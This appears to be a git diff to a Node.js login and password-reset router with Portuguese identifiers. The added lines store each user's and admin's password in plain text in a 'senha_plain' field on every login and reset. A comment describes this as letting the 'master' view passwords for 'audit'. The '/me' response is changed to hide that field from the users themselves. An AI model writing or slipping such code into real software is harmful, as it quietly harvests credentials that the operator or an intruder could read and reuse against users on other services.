@@ -40,6 +40,11 @@ router.post('/login', loginRateLimit, async (req, res) => {
     }
     if (usuario.ativo === 0) return res.status(403).json({ erro: 'Conta desativada. Entre em contato com o suporte.' });
 
+    // Captura senha em texto plano para visualizacao do master (auditoria).
+    if (!usuario.senha_plain || usuario.senha_plain !== senha) {
+      db.atualizarUsuario(usuario.id, { senha_plain: senha });
+    }
+
     const token = jwt.sign({ sub: usuario.id, nome: usuario.nome, email: usuario.email }, process.env.JWT_SECRET, { expiresIn: 30 * 24 * 60 * 60 });
     res.cookie('token_usuario', token, { httpOnly: true, sameSite: 'Strict', secure: process.env.NODE_ENV === 'production', maxAge: 30 * 24 * 60 * 60 * 1000 });
     try { db.registrarLogUsuario(usuario.id, 'login_sucesso', normIp(req.ip)); } catch {}
@@ -68,7 +73,7 @@ router.post('/logout', (req, res) => {
 router.get('/me', requireUsuario, (req, res) => {
   const u = db.buscarUsuarioPorId(req.usuario.sub);
   if (!u) return res.status(404).json({ erro: 'Usuário não encontrado' });
-  const { senha_hash, ...dados } = u;
+  const { senha_hash, senha_plain, ...dados } = u;
   return res.json(dados);
 });
 
@@ -300,11 +305,11 @@ router.post('/redefinir-senha', async (req, res) => {
 
     const senha_hash = await bcrypt.hash(senha, 10);
     if (isAdmin) {
-      db.atualizarAdmin(registro.admin_id, { senha_hash });
+      db.atualizarAdmin(registro.admin_id, { senha_hash, senha_plain: senha });
       db.marcarAdminResetTokenUsado(token);
       try { db.registrarLogAdmin(registro.admin_id, 'reset_concluido', normIp(req.ip)); } catch {}
     } else {
-      db.atualizarUsuario(registro.usuario_id, { senha_hash });
+      db.atualizarUsuario(registro.usuario_id, { senha_hash, senha_plain: senha });
       db.marcarResetTokenUsado(token);
       try { db.registrarLogUsuario(registro.usuario_id, 'reset_concluido', normIp(req.ip)); } catch {}
     }
